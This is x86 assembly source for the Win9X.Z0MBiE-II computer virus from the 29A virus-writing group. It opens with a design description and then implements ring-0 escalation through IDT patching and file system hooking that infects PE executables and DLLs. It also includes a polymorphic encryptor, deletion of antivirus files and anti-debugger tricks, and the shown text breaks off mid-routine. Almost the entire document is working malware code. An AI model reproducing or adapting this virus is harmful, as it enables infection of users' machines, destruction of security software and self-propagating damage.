   ; ===========================================================================
   ; Win9X.Z0MBiE-II                            copyright (c) 1998 by Z0MBiE/29A
   ; made in Moscow, Russia                                 z0mbie_29a@yahoo.com
   ;      *** NOT FOR [RE]PUBLISHING IN VX ZINES IN ANY FORM, EXCEPT 29A ***
   ; ===========================================================================

   ; Waves, big like a house
   ; They're stranded on a piece of wood
   ; To leave it all behind
   ; To start again
   ;
   ; But instead of a new life
   ; All they find is a door that's closed
   ; And they keep looking for
   ; A place called hope
   ;                    Scorpions

   ;                          *** VIRUS DESCRIPTION ***
   ; on program load:
   ;   - process polymorphic decryptor
   ;   - allocate some stack for vars, make copy of unmodified virus
   ;   - patch IDT/int 0d address, then execute INT 0D - we`re in ring0
   ;   - if infection method #1:
   ;      - restore program code section attributes using _PageModifyPermissions
   ;      - restore program code replaced by virus body
   ;   - allocate memory using _PageAlloc, go to new location
   ;   - using _PageModifyPermissions make our pages unaccessible from ring3
   ;   - init handlers using _FileSystemApiHook & _Hook_PM_Fault
   ;   - return to program/dll
   ; on FS call, IFSFN_OPEN/IFSFN_RENAME/IFSFN_FILEATTRIB
   ;   - infect PE-EXE & PE-DLL files
   ;       - infecting with previously (at startup) saved copy of virus
   ;       - poly engine: (very simple, expanding coeff. ~2.5)
   ;           mov REGi, random_value
   ;           cmd REGj, random_value / cmd REGj, some_calculated_value
   ;           push REGk/push CONST
   ;           ...
   ;           jmp esp
   ;       - 2 methods of infection, 1st try method #1
   ;         1:  - find place in section with std. CODE attributes, write virus
   ;               there, then write encrypted original bytes from CODE section
   ;               to the end of last section, then increase last section's
   ;               physical/virtual sizes
   ;               this method used for std. PE-EXE files
   ;         2:  - add new section
   ;               this method used for some PE-EXE file & all PE-DLL files
   ;     - process S&D on CODE section (for only method #1)
   ;     - "alredy infected" sign is PE_Header.TimeStamp equal to 0
   ; on INT 06
   ;   - S&D handler (for only 32-bit apps)
   ; other features:
   ;   - "active protection" - rewrite+delete some files (AV,etc) on access
   ;   - internal nop-filled buffer; each time fs handler is called,
   ;     random jmp/call from virus's body is replaced with jmp to this
   ;     buffer and correct jmp is stored to buffer till it has some free space
   ;   - Soft-ICE protection

   ; a) to compile virus use asm.bat
   ; b) tasm32 options:  /ml /m
   ;    tlink32 options: -Tpe -c

   ;                                Seek & Enjoy !

   ;DEBUG                   equ     YEZ     ; infect only .z0m files&dont kill av

   vir_size_infile         equ     (((vir_size)*5/2+4095) and (not 4095))

   IFSMGR_Ring0_FileIO     equ     000400032h

   R0_OPENCREATFILE        equ     0D500h  ; Open/Create a file
   R0_OPENCREAT_IN_CONTEXT equ     0D501h  ; Open/Create file in current context
   R0_READFILE             equ     0D600h  ; Read a file, no context
   R0_WRITEFILE            equ     0D601h  ; Write to a file, no context
   R0_READFILE_IN_CONTEXT  equ     0D602h  ; Read a file, in thread context
   R0_WRITEFILE_IN_CONTEXT equ     0D603h  ; Write to a file, in thread context
   R0_CLOSEFILE            equ     0D700h  ; Close a file
   R0_GETFILESIZE          equ     0D800h  ; Get size of a file
   R0_FINDFIRSTFILE        equ     04E00h  ; Do a LFN FindFirst operation
   R0_FINDNEXTFILE         equ     04F00h  ; Do a LFN FindNext operation
   R0_FINDCLOSEFILE        equ     0DC00h  ; Do a LFN FindClose operation
   R0_FILEATTRIBUTES       equ     04300h  ; Get/Set Attributes of a file
   GET_ATTRIBUTES          equ     00h
   SET_ATTRIBUTES          equ     01h
   R0_RENAMEFILE           equ     05600h  ; Rename a file
   R0_DELETEFILE           equ     04100h  ; Delete a file
   R0_LOCKFILE             equ     05C00h  ; Lock/Unlock a region in a file
   R0_GETDISKFREESPACE     equ     03600h  ; Get disk free space
   R0_READABSOLUTEDISK     equ     0DD00h  ; Absolute disk read
   R0_WRITEABSOLUTEDISK    equ     0DE00h  ; Absolute disk write


   dta_struc               struc
   dta_fileattr            dd      ?
   dta_time_creation       dq      ?
   dta_time_lastaccess     dq      ?
   dta_time_lastwrite      dq      ?
   dta_filesize_hi         dd      ?
   dta_filesize            dd      ?
   dta_reserved_0          dd      ?
   dta_reserved_1          dd      ?
   dta_filename            db      260 dup (?)
   dta_filename_short      db      14 dup (?)
                           ends

   mz_struc                struc
   mz_id                   dw      ?               ; MZ/ZM
   mz_last512              dw      ?
   mz_num512               dw      ?
   mz_relnum               dw      ?
   mz_hdrsize              dw      ?               ; in PAR
   mz_minmem               dw      ?
   mz_maxmem               dw      ?
   mz_ss                   dw      ?
   mz_sp                   dw      ?
   mz_csum                 dw      ?               ; 0
   mz_ip                   dw      ?
   mz_cs                   dw      ?
   mz_relofs               dw      ?
   mz_ovrnum               dw      ?               ; 0
                           db      32 dup (?)
   mz_neptr                dd      ?
                           ends

   pe_struc                struc
   pe_id                   dd      ?       ; 00 01 02 03  pe00
   pe_cputype              dw      ?       ; 04 05        14c..14e: i386..i586
   pe_numofobjects         dw      ?       ; 06 07
   pe_datetime             dd      ?       ; 08 09 0a 0b  date/time
   pe_cofftableptr         dd      ?       ; 0c 0d 0e 0f
   pe_cofftablesize        dd      ?       ; 10 11 12 13
   pe_ntheadersize         dw      ?       ; 14 15
   pe_exe_flags            dw      ?       ; 16 17
                           ; ntheader
   pe_ntheader_id          dw      ?       ; 18 19
   pe_linkmajor            db      ?       ; 19
   pe_linkminor            db      ?       ; 1a
   pe_sizeofcode           dd      ?       ; 1c 1d 1e 1f
   pe_sizeofinitdata       dd      ?       ; 20 21 22 23
   pe_sizeofuninitdata     dd      ?       ; 24 25 26 27
   pe_entrypointrva        dd      ?       ; 28 29 2a 2b
   pe_baseofcoderva        dd      ?       ; 2c 2d 2e 2f
   pe_baseofdatarva        dd      ?       ; 30 31 32 33
   pe_imagebase            dd      ?       ; 34 35 36 37    align: 64k
   pe_objectalign          dd      ?       ; 39 30 3a 3b  256n > power2 > 512
   pe_filealign            dd      ?       ; 3c 3d 3e 3f   64k > power2 > 512
   pe_osmajor              dw      ?       ; 40 41
   pe_osminor              dw      ?       ; 42 43
   pe_usermajor            dw      ?       ; 44 45
   pe_userminor            dw      ?       ; 46 47
   pe_subsysmajor          dw      ?       ; 48 49
   pe_subsysminor          dw      ?       ; 4a 4b
                           dd      ?       ; 4c 4d 4e 4f
   pe_imagesize            dd      ?       ; 50 51 52 53  align: objectalign
   pe_headersize           dd      ?       ; 54 55 56 57  dosh+peh+objecttable
   pe_checksum             dd      ?       ; 58 59 5a 5b  0
   pe_subsystem            dw      ?       ; 5c 5d
   pe_dllflags             dw      ?       ; 5e 5f
   pe_stackreservesize     dd      ?       ; 60 61 62 63
   pe_stackcommitsize      dd      ?       ; 64 65 66 67
   pe_heapreservesize      dd      ?       ; 68 69 6a 6b
   pe_heapcommitsize       dd      ?       ; 6c 6d 6e 6f
   pe_loaderflags          dd      ?       ; 70 71 72 73
   pe_numofrvaandsizes     dd      ?       ; 74 75 76 77   =10h
                           ; rva/sizes
   pe_rvasizes             label   dword
   pe_exporttablerva       dd      ?       ; 78 79 7a 7b
   pe_exporttablesize      dd      ?       ; 7c 7d 7e 7f
   pe_importtablerva       dd      ?       ; 80 81 82 83
   pe_importtablesize      dd      ?       ; 84 85 86 87
   pe_resourcetablerva     dd      ?       ; 88 89 8a 8b
   pe_resourcetablesize    dd      ?       ; 8c 8d 8e 8f
   pe_exceptiontablerva    dd      ?       ; 90 91 92 93
   pe_exceptiontablesize   dd      ?       ; 94 95 96 97
   pe_securitytablerva     dd      ?       ; 98 99 9a 9b
   pe_securitytablesize    dd      ?       ; 9c 9d 9e 9f
   pe_fixuptablerva        dd      ?       ; a0 a1 a2 a3
   pe_fixuptablesize       dd      ?       ; a4 a5 a6 a7
   pe_debugtablerva        dd      ?       ; a8 a9 aa ab
   pe_debugtablesize       dd      ?       ; ac ad ae af
   pe_imgdescrrva          dd      ?       ; b0 b1 b2 b3
   pe_imgdescrsize         dd      ?       ; b4 b5 b6 b7
   pe_machinerva           dd      ?       ; b8 b9 ba bb
   pe_machinesize          dd      ?       ; bc bd be bf
   pe_tlsrva               dd      ?       ; c0 c1 c2 c3
   pe_tlssize              dd      ?       ; c4 c5 c6 c7
   pe_loadcfgrva           dd      ?       ; c8 c9 ca cb
   pe_loadcfgsize          dd      ?       ; cc cd ce cf
                           dq      ?       ; d0 d1 d2 d3 d4 d5 d6 d7
   pe_iattablerva          dd      ?       ; d8 d9 da db
   pe_iattablesize         dd      ?       ; dc dd de df
                           dq      ?       ; e0 e1 e2 e3 d4 e5 e6 e7
                           dq      ?       ; e8 e9 ea eb ec ed ee ef
                           dq      ?       ; f0 f1 f2 f3 f4 f5 f6 f7
                           ends

   oe_struc                struc
   oe_section_name         db      8 dup (?);00 01 02 03 04 05 06 07
   oe_virt_size            dd      ?       ; 08 09 0a 0b
   oe_virt_rva             dd      ?       ; 0c 0d 0e 0f  align: objectalign
   oe_phys_size            dd      ?       ; 10 11 12 13
   oe_phys_offs            dd      ?       ; 14 15 16 17  align: filealign
                           db      12 dup (?);for obj file
   oe_section_flags        dd      ?        ; 24 25 26 27
                           ends

   VxDcall                 macro   Service
                           db      0CDh
                           db      020h
                           dd      Service
                           endm

   VMMcall                 macro   Service
                           VxDcall VMM&Service&
                           endm

                           p386
                           model   flat

                           locals  __
                           jumps

                           .code

   start:
                           db      0b8h
   @@kbase                 dd      0

   replace_start:
                           mov     ecx, [esp+eax]
                           mov     eax, [esp+eax+4]

                           push    ebp

                           sub     esp, size sdata / 2 - 4
                           push    eax
                           sub     esp, size sdata / 2

                           mov     ebp, esp
                           cld

   sdata                   struc
   kernel_ptr_r3           dd      ?
   dllbase                 dd      ?
   idtr                    label   fword
   idt_limit               dw      ?
   idt_base                dd      ?
   idt_entry_saved         dq      ?
   r3_vir_copy             db      vir_size dup (?)
                           db      10 dup (?)
                           align   16
                           ends

                           mov     dllbase[esp], eax

                           and     ecx, 0FFFF0000h
                           add     ecx, 65536
   __again:                sub     ecx, 65536
                           cmp     word ptr [ecx], 'ZM'
                           jne     __again
                           mov     kernel_ptr_r3[esp], ecx

   x                       equ     <[ebp]-401000h>
   y                       equ     <+(vir_copy-start)>

                           pusha
                           call    get_base_ebp
                           cmp     @@vir_type x, 1
                           jne     __skip
                           mov     esi, @@orig_rva x
                           add     esi, @@imagebase x
                           mov     ecx, vir_size_infile/4
                           rep     lodsd
                           mov     esi, @@vir_rva x
                           add     esi, @@imagebase x
                           mov     ecx, vir_size_infile/4
                           rep     lodsd
   __skip:                 popa

                           call    get_base_eax
                           xchg    esi, eax
                           lea     edi, r3_vir_copy[esp]
                           mov     ecx, vir_size
                           rep     movsb

                           sidt    idtr[esp]

                           mov     esi, idt_base[esp]
                           add     esi, 0Dh*8

                           lea     edi, idt_entry_saved[esp]

                           push    esi
                           push    edi

                           movsd
                           movsd

                           pop     esi
                           pop     edi

   ;               2 2 2 2 2 1 1 1 1 1 1 1 1 1 1
   ;31             4 3 2 1 0 9 8 7 6 5 4 3 2 1 0 9 8 7 6 5 4      0
   ;------------------------------------------------------------------
   ;|                               | | D |         |     |          |
   ;|           RESERVED            |P| P |0 1 1 1 0|0 0 0| RESERVED | +4
   ;|                               | | L |         |     |          |
   ;|----------------------------------------------------------------|
   ;|       SEGMENT SELECTOR        |         OFFSET  15:00          | +0
   ;------------------------------------------------------------------

   ; P      1      segment present
   ; DPL    11     ring 3
   ;        01110  const

   c_idt_desc_offs         equ     int0D - start
   c_idt_desc_selector     equ     28h
   c_idt_desc_type         equ     1110111000000000b   ; P=1 DPL=3 01110=CONST

   ;                       dw      c_idt_desc_offs and 65535
   ;                       dw      c_idt_desc_selector
   ;                       dw      c_idt_desc_type
   ;                       dw      c_idt_desc_offs shr 16

                           mov     ecx, 100000     ; to avoid fuckup because of
   __wait:                 in      al, 80h         ; twice-patched IDT
                           cmp     al, 88h
                           loope   __wait
                           mov     al, 88h
                           out     80h, al

                           pusha
                           call    get_base_eax
                           add     eax, c_idt_desc_offs
                           stosw
                           shld    ebx, eax, 16
                           mov     ax, c_idt_desc_selector
                           stosw
                           mov     ax, c_idt_desc_type
                           stosw
                           xchg    ebx, eax
                           stosw
                           popa

                           int     0Dh

                           add     esp, size sdata
                           pop     ebp
                           ret

   naebka_1:               jnc     naebka_2
                           call    naebka_4

   back_from_r0:           add     esp, size sdata
                           pop     ebp
                           jmp     eax

   int0D:                  movsd
                           movsd

                           mov     al, 0FFh
                           out     80h, al

                           call    vx_init

                           cli

                           push    ebp
                           mov     edx, kernel_ptr_r3[ebp]

                           call    get_base_ebp

   PC_WRITEABLE            equ     00020000H
   PC_USER                 equ     00040000H
   PC_STATIC               equ     20000000H

   VMM_PageModifyPermissions       equ     000010133h

                           cmp     @@vir_type x, 1
                           jne     __skip_1

   xx_offs                 equ     50h
                           add     edx, xx_offs

                           push    [edx].dword ptr 0
                           push    [edx].dword ptr 4
                           push    edx

                           lea     esi, __vxd_ret x

                           push    PC_WRITEABLE+PC_STATIC+PC_USER     ; OR_MASK
                           push    0                ; AND_MASK
                           push    @@codesect_pagecount x
                           push    @@codesect_pageaddr12 x
   ;                       VMMcall _PageModifyPermissions

                           mov     [edx].word ptr 0, 20CDh
                           mov     [edx].dword ptr 2, VMM_PageModifyPermissions
                           mov     [edx].word ptr 6, 0E6FFh  ; jmp esi
                           jmp     edx
   __vxd_ret:
                           add     esp, 4*4

                           cli

                           pop     edx
                           pop     [edx].dword ptr 4
                           pop     [edx].dword ptr 0

                           test    @@codesect_flags x, 80000000h
                           jnz     __go

                           push    PC_STATIC+PC_USER     ; OR_MASK
                           push    not PC_WRITEABLE          ; AND_MASK
                           push    @@codesect_pagecount x
                           push    @@codesect_pageaddr12 x
                           VMMcall _PageModifyPermissions
                           add     esp, 4*4

                           cli
   __go:

   __skip_1:

                           pop     ebp
                           push    ebp

                           call    ring0_code

                           cli

                           pop     ebp

                           lea     eax, r3_vir_copy[ebp]
                           add     eax, __r3stack - start
                           jmp     eax

   __r3stack:              mov     ecx, dllbase[ebp]

                           call    get_base_ebp

                           mov     ebx, @@imagebase x

                           cmp     @@vir_type x, 1
                           jne     __skip_2

                           mov     edx, @@decr_key x

                           mov     esi, @@orig_rva x
                           mov     edi, @@vir_rva x
                           add     esi, ebx
                           add     edi, ebx

                           push    ecx
                           mov     ecx, vir_size_infile / 4
                           cld

   ;                       in      al, 61h
   ;                       or      al, 3
   ;                       out     61h, al

   __decr_1:               lodsd

                           sub     eax, edx
                           stosd

                           rol     edx, 13
                           dec     edx

                           loop    __decr_1

   ;                       in      al, 61h
   ;                       and     al, not 3
   ;                       out     61h, al

                           pop     ecx

   __skip_2:
                           cmp     @@vir_type x, 0
                           je      __iret
                           cmp     @@vir_type x, 2
                           je      __mmm2

   __back:                 lea     eax, back_from_r0 x
                           mov     [esp], eax        ; INT stack frame->EIP

                           mov     eax, @@saveeip x  ; eax=return address
                           add     eax, ebx

   __iret:                 call    vx_done

                           iret

   __mmm2:                 cmp     @@is_dll x, 1
                           jne     __back

                           mov     eax, @@saveeip x
                           add     eax, ecx

                           lea     ecx, back_from_r0_dll x
                           mov     [esp], ecx

                           mov     edx, @@kbase x

                           call    vx_done

                           iret

   naebka_3:               jc      naebka_4

   back_from_r0_dll:       add     esp, size sdata
                           pop     ebp

                           add     esp, edx

                           or      eax, eax
                           jz      __eax_0

                           jmp     eax

   __eax_0:                mov     eax, 1
                           retn    0ch

   VMM_Begin_Critical_Section      equ     00001001Fh
   VMM_End_Critical_Section        equ     000010020h

   vx_init:                pusha
                           mov     ecx, 110111b
                           VMMcall _Begin_Critical_Section
                           popa
                           ret

   vx_done:                pusha
                           VMMcall _End_Critical_Section
                           popa
                           ret

   id_offs                 equ     0040h
   id_byte                 equ     'Z'

   ring0_code:             cli

                           mov     edx, kernel_ptr_r3[ebp]
                           cmp     byte ptr ds:[edx + id_offs], id_byte
                           je      __ret    ; NC

   VMM_PageAllocate        equ     000010053h
   PAGEZEROINIT            equ     00000001h
   PAGEFIXED               equ     00000008h
   PG_SYS                  equ     1

                           push    edx

                           push    PAGEFIXED + PAGEZEROINIT
                           xor     eax, eax
                           push    eax     ; PhysAddr
                           push    eax     ; maxPhys
                           push    eax     ; minPhys
                           push    eax     ; Align
                           push    eax     ; handle of VM = 0 if PG_SYS
                           push    PG_SYS  ; allocate memory in system area
                           push    virPages; nPages
                           VMMcall _PageAllocate
                           add     esp, 8*4

                           cli

                           pop     edx

                           or      eax, eax; error?
                           jz      __ret_error

                           mov     edi, eax          ; pointer to new r0 location
                           lea     esi, r3_vir_copy[ebp]
                           mov     ecx, vir_size     ; size of code
                           rep     movsb

                           pusha
                           push    PC_STATIC                  ; OR_MASK
                           push    not (PC_WRITEABLE+PC_USER) ; AND_MASK
                           push    virPages
                           shr     eax, 12
                           push    eax
                           VMMcall _PageModifyPermissions
                           add     esp, 4*4

                           cli

                           popa

                           sub     edi, vir_size - (__new_r0_loc - start)
                           jmp     edi

   __new_r0_loc:           lea     esi, r3_vir_copy[ebp]

                           call    get_base_ebp

                           mov     kernel_base x, edx

                           lea     edi, vir_copy x
                           mov     ecx, vir_size
                           rep     movsb

                           mov     byte ptr ds:[edx + id_offs], id_byte

           IFDEF   DEBUG
                           mov     dword ptr ds:[edx + id_offs + 16], ebp
           ENDIF

                           call    xor_copy

                           call    hook_IFS
                           call    hook_faults

                           cli

                           call    get_base_ebp
                           sidt    r0_idt x
                           mov     eax, dword ptr r0_idt x + 2
                           add     eax, eblo
                           mov     bx, [eax+01h*8-eblo].word ptr 6
                           shl     ebx, 16
                           mov     bx, [eax+01h*8-eblo].word ptr 0
                           mov     byte ptr [ebx], 0CFh
                           mov     bx, [eax+03h*8-eblo].word ptr 6
                           shl     ebx, 16
                           mov     bx, [eax+03h*8-eblo].word ptr 0
                           mov     byte ptr [ebx], 0CFh

   __ret:                  ret

   __ret_error:

           IFDEF   DEBUG
                           mov     ecx, 10
                           call    debug_beep
                           loop    $-5
           ENDIF

                           ret

   naebka_6:               call    naebka_7

   hook_IFS:

   IFSMGR_InstallFileSystemApiHook equ     000400067h

                           lea     eax, ifs_handler x
                           push    eax
                           VxDcall IFSMGR_InstallFileSystemApiHook
                           add     esp, 1*4

                           or      eax, eax
                           jz      __ret

                           mov     oldhandler_ptr_ptr x, eax

                           mov     entered x, 0

   __ret:                  ret

   VMM_Hook_V86_Fault      equ     00001007Fh
   VMM_Hook_PM_Fault       equ     000010080h
   VMM_Hook_VMM_Fault      equ     000010081h

   hook_faults:
                           mov     eax, 06h
                           lea     esi, fault_handler x
                           VMMcall _Hook_PM_Fault
                           mov     fault_previous x, esi

                           ret

   VMM_Allocate_GDT_Selector       equ     000010076h
   VMM_VMMCreateThread             equ     000010105h

   get_base_ebp:           call    $+5
                           pop     ebp
                           sub     ebp, offset $-1-start
                           ret

   get_base_eax:           call    $+5
                           pop     eax
                           sub     eax, offset $-1-start
                           ret

   naebka_5:               jmp     naebka_6

   Client_Reg_Struc        struc
   Client_EDI              dd      ?       ; client's EDI
   Client_ESI              dd      ?       ; client's ESI
   Client_EBP              dd      ?       ; client's EBP
                           dd      ?       ; ESP when pusha instruction is executed
   Client_EBX              dd      ?       ; client's EBX
   Client_EDX              dd      ?       ; client's EDX
   Client_ECX              dd      ?       ; client's ECX
   Client_EAX              dd      ?       ; client's EAX
   Client_Error            dd      ?       ; doubleword error code
   Client_EIP              dd      ?       ; EIP
   Client_CS               dw      ?,?     ; CS
   Client_EFlags           dd      ?       ; EFLAGS
   Client_ESP              dd      ?       ; ESP
   Client_SS               dw      ?,?     ; SS
   Client_ES               dw      ?,?     ; ES
   Client_DS               dw      ?,?     ; DS
   Client_FS               dw      ?,?     ; FS
   Client_GS               dw      ?,?     ; GS
   Client_Alt_EIP          dd      ?
   Client_Alt_CS           dw      ?,?
   Client_Alt_EFlags       dd      ?
   Client_Alt_ESP          dd      ?
   Client_Alt_SS           dw      ?,?
   Client_Alt_ES           dw      ?,?
   Client_Alt_DS           dw      ?,?
   Client_Alt_FS           dw      ?,?
   Client_Alt_GS           dw      ?,?
                           ends

   fault_handler:          pushf
                           push    eax
                           push    esi

                        ;  db      0FFh                    +0
                        ;  db      0FFh                    +1
                        ;  db      ????Xxxx                +2
                        ;  dw      OLD_DATA xor word(EIP)  +3 +4
                        ;     hi_word = X
                        ;  dw      ?                       +5 +6

                           mov     esi, [ebp].Client_EIP

                           test    esi, 0FFFF0000h
                           jz      __go_next_handler

                           mov     ax, [esi]

                           cmp     ax, 0FFFFh
                           jne     __go_next_handler


           IFDEF   DEBUG
                           call    debug_beep
           ENDIF
                           mov     byte ptr [esi], 0E8h

                           mov     al, [esi+2]
                           and     ax, 1111b
                           test    al, 1000b
                           jz      __1
                           or      ax, 1111111111110000b
   __1:                    shl     eax, 16
                           mov     ax, [esi+3]
                           xor     ax, si

                           mov     [esi+1], eax

                           mov     word ptr [esi+5], 0C483h

   __exit_handler:         pop     esi
                           pop     eax
                           popf
                           ret

   __go_next_handler:      pop     esi
                           pop     eax
                           popf

                           jmp     go_prev_fault


   ifs_onstack_struc       struc
                           dd      ? ; saved ebp
                           dd      ? ; return address
                           dd      ? ; the address of the FSD function that is to be called for this API
   _function               dd      ? ; the function that is being performed
   _drive                  dd      ? ; the 1-based drive the operation is being performed on (-1 if UNC)
                           dd      ? ; the kind of resource the operation is being performed on
   _codepage               dd      ? ; the codepage that the user string was passed in on
   _ioreq_ptr              dd      ? ; pointer to IOREQ structure
                           ends

   ifs_handler:            push    ebp

                           call    get_base_ebp

   x                       equ     <[ebp]-401000h>

                           cmp     entered x, 0
                           jne     __quit
                           inc     entered x

                           ;;

                           mov     eax, [esp]._function

   IFSFN_OPEN              equ     36
   IFSFN_RENAME            equ     37
   IFSFN_FILEATTRIB        equ     33

                           cmp     eax, IFSFN_OPEN
                           je      __my_func
                           cmp     eax, IFSFN_RENAME
                           je      __my_func
                           cmp     eax, IFSFN_FILEATTRIB
                           je      __my_func

   __exit:                 dec     entered x

   __quit:                 pop     ebp

                           jmp     go_old_ifs_handler


   __my_func:              pusha

                           lea     edi, filename x
                           cld             ; !

                           mov     filename_ptr x, edi

                           mov     eax, [esp]._drive + 32

                           cmp     al, -1
                           je      __skip

                           or      al, al
                           jz      __skip_drive

                           add     al, 'A'-1

                           cmp     al, 'A'
                           jl      __skip
                           cmp     al, 'Z'
                           jg      __skip

                           stosb
                           mov     al, ':'
                           stosb

   __skip_drive:

   IFSMGR_UniToBCSPath     equ     000400041h

                           mov     eax, [esp]._codepage+32 ; BCS_WANSI/BCS_OEM
                           push    eax
                           push    filename_size-1 ; max name length
                           mov     eax, [esp]._ioreq_ptr+ 8+ 32
                           mov     eax, [eax] + 0Ch    ; filename
                           add     eax, 4          ; skip "
                           push    eax             ; uni-str
                           push    edi             ; output-str
                           VxDcall IFSMGR_UniToBCSPath
                           add     esp, 4*4

                           mov     byte ptr [edi+eax], 0

                           call    infect_file

   __skip:                 popa
                           jmp     __exit

   infect_file:            pusha

                           call    get_base_ebp
                           cld

                           call    xor_copy

                           call    replace_proc

                           xor     eax, eax        ; |-))
                           mov     dr0, eax
                           mov     dr1, eax
                           mov     dr2, eax
                           mov     dr3, eax

                           mov     edx, filename_ptr x
                           mov     ecx, 1+2+4+32     ; hsra
                           lea     esi, dta x
                           call    ffindfirst
                           jc      __exit
                           call    ffindclose

                           ;;

                           mov     esi, filename_ptr x
   __5:                    inc     esi
                           cmp     byte ptr [esi], 0
                           jne     __5
   __6:                    dec     esi
                           cmp     byte ptr [esi], '\'
                           jne     __6
                           inc     esi

                           lea     edi, shortname x
                           push    edi
                           mov     ecx, short_name_len+short_ext_len
                           mov     al, 32
                           rep     stosb
                           pop     edi

                           mov     ecx, short_name_len
   __b:                    lodsb
                           or      al, al
                           jz      __a
                           cmp     al, '.'
                           je      __c
                           or      ecx, ecx
                           jle     __b
                           stosb
                           dec     ecx
                           jmp     __b
   __c:                    lea     edi, shortname x + short_name_len
                           mov     ecx, short_ext_len
   __d:                    lodsb
                           or      al, al
                           jz      __a
                           stosb
                           loop    __d
   __a:

                           ;;

                           lea     esi, shortname x

                           lea     edi, kewl_names x
                           call    is_in_list
                           jc      __exit

                           lea     edi, suck_names x
                           call    is_in_list
                           jnc     __good_file

           IFNDEF  DEBUG
                           mov     edx, filename_ptr x
                           call    fdelete
           ELSE
                           nop
           ENDIF

                           jmp     __exit
   __good_file:
                           ;;

           IFDEF   DEBUG
                           mov     edi, filename_ptr x
                           mov     ecx, filename_size
                           xor     al, al
                           cld
                           repnz   scasb
                           mov     eax, [edi].dword ptr -5
                           or      eax, 20202000h
                           cmp     eax, 'm0z.'
                           jne     __exit
           ENDIF

   infect_minsize          equ     16384             ; 16K
   infect_maxsize          equ     100*1024*1024     ; 100M

                           mov     eax, dta.dta_filesize x
                           cmp     eax, infect_minsize
                           jb      __exit
                           cmp     eax, infect_maxsize
                           ja      __exit

                           mov     edx, filename_ptr x
                           mov     ecx, 32
                           call    fsetattr
                           jc      __exit

                           mov     edx, filename_ptr x
                           call    fopen
                           jc      __restattr
                           mov     filehandle x, eax

                           lea     edx, mz x
                           mov     ecx, size mz
                           mov     ebx, filehandle x
                           xor     esi, esi          ; filepos
                           call    fread

                           mov     ax, mz.mz_id x
                           cmp     ax, 'ZM'
                           jne     __close

                           cmp     mz.mz_relnum x, 0
                           je      __1
                           cmp     mz.mz_relofs x, 40h
                           jb      __close

   __1:                    mov     esi, mz.mz_neptr x

                           lea     edx, pe x
                           mov     ecx, size pe
                           mov     ebx, filehandle x
                           call    fread
                           cmp     ecx, size pe
                           jne     __close
                           add     esi, ecx

                           cmp     pe.pe_ntheadersize x, 0E0h
                           jne     __close

                           cmp     pe.pe_datetime x, 0
                           je      __close

                           mov     eax, pe.pe_entrypointrva x
                           or      eax, eax
                           jz      __close
                           mov     @@saveeip x y, eax

                           mov     @@is_dll x y, 1

                           mov     ax, pe.pe_exe_flags x
                           test    al, 2         ; executable
                           jz      __close
                           test    ah, 20h       ; dll?    1=fixed
                           jnz     __method_2

                           cmp     pe.pe_dllflags x, 0
                           jne     __method_2

   ;                       cmp     pe.pe_imagebase x, 400000h
   ;                       jne     __close

                           mov     @@is_dll x y, 0


                           ;;

                           movzx   edi, pe.pe_numofobjects x
   __try_section:          or      edi, edi
   ;                       jz      __set_stamp
                           jz      __method_2

                           mov     oeV_ptr x, esi

                           lea     edx, oeV x
                           mov     ecx, size oe_struc
                           mov     ebx, filehandle x
                           call    fread
                           cmp     ecx, size oe_struc
                           jne     __close
                           add     esi, ecx

                           mov     eax, oeV.oe_section_flags x
                           and     eax, 60000020h ; read,exec,code
                           cmp     eax, 60000020h
                           jne     __nextsection

                           mov     eax, oeV.oe_virt_rva x    ; eax=v.start RVA

   __restart:              mov     ebx, vir_size_infile
                           cmp     ebx, oeV.oe_phys_size x
                           ja      __nextsection
                           add     ebx, eax                 ; ebx=v.end RVA

                           mov     ecx, oeV.oe_virt_rva x
                           add     ecx, oeV.oe_phys_size x
                           cmp     ebx, ecx
                           ja      __nextsection

                           mov     ecx, pe.pe_numofrvaandsizes x

   __2:                    dec     ecx
                           js      __offset_found

                           cmp     pe.pe_rvasizes[ecx*8+4] x, 0
                           je      __2
                           mov     edx, pe.pe_rvasizes[ecx*8+0] x
                           cmp     edx, ebx
                           ja      __2
                           add     edx, pe.pe_rvasizes[ecx*8+4] x
                           cmp     edx, eax
                           jbe     __2

                           mov     eax, edx
                           jmp     __restart

   __nextsection:          dec     edi
                           jmp     __try_section

   __offset_found:         mov     @@vir_rva x y, eax

                           sub     eax, oeV.oe_virt_rva x
                           add     eax, oeV.oe_phys_offs x
                           mov     @@vir_offset x y, eax

                           mov     eax, oeV.oe_virt_rva x
                           add     eax, pe.pe_imagebase x
                           shr     eax, 12
                           mov     @@codesect_pageaddr12 x y, eax

                           mov     eax, oeV.oe_virt_size x
                           add     eax, 4095
                           shr     eax, 12
                           mov     @@codesect_pagecount x y, eax

                           mov     eax, oeV.oe_section_flags x
                           mov     @@codesect_flags x y, eax

   ;                       and     oeV.oe_section_flags x, not 80000000h ; clear W
                           btr     oeV.oe_section_flags x, 15

                           mov     eax, pe.pe_imagebase x
                           mov     @@imagebase x y, eax

                           ;;

                           call    __read_last_sect

                           mov     eax, oeL.oe_virt_rva x
                           add     eax, oeL.oe_phys_size x
                           mov     @@orig_rva x y, eax

                           mov     eax, oeL.oe_phys_offs x
                           add     eax, oeL.oe_phys_size x
                           mov     @@orig_offs x y, eax

                           sub     eax, dta.dta_filesize x
                           neg     eax
                           cmp     eax, pe.pe_objectalign x
                           ja      __method_2

                           mov     eax, oeL.oe_phys_size x
                           cmp     eax, oeL.oe_virt_size x
                           jbe     __size_okey
                           sub     eax, oeL.oe_virt_size x
                           cmp     eax, vir_size_infile
                           jae     __method_2
                           add     oeL.oe_virt_size x, eax
                           add     pe.pe_imagesize x, eax
   __size_okey:


                           add     oeL.oe_phys_size x, vir_size_infile
                           add     oeL.oe_virt_size x, vir_size_infile
                           add     pe.pe_imagesize x, vir_size_infile

                           lea     edx, oeL x
                           mov     ecx, size oe_struc
                           mov     ebx, filehandle x
                           call    fwrite

                           ;;

                           lea     edx, orig_bytes x
                           mov     ecx, vir_size_infile
                           mov     esi, @@vir_offset x y
                           mov     ebx, filehandle x
                           call    fread

                           ;;
                           call    random_eax
                           xchg    edx, eax

                           mov     @@decr_key x y, edx

                           lea     esi, orig_bytes x
                           mov     ecx, vir_size_infile / 4
   __encr_1:               mov     eax, [esi]
                           add     eax, edx
                           mov     [esi], eax
                           rol     edx, 13
                           dec     edx
                           add     esi, 4
                           loop    __encr_1

                           ;;

                           lea     edx, orig_bytes x
                           mov     ecx, vir_size_infile
                           mov     esi, @@orig_offs x y
                           mov     ebx, filehandle x
                           call    fwrite

                           mov     @@vir_type x y, 1

                           call    poly_engine

                           ;;

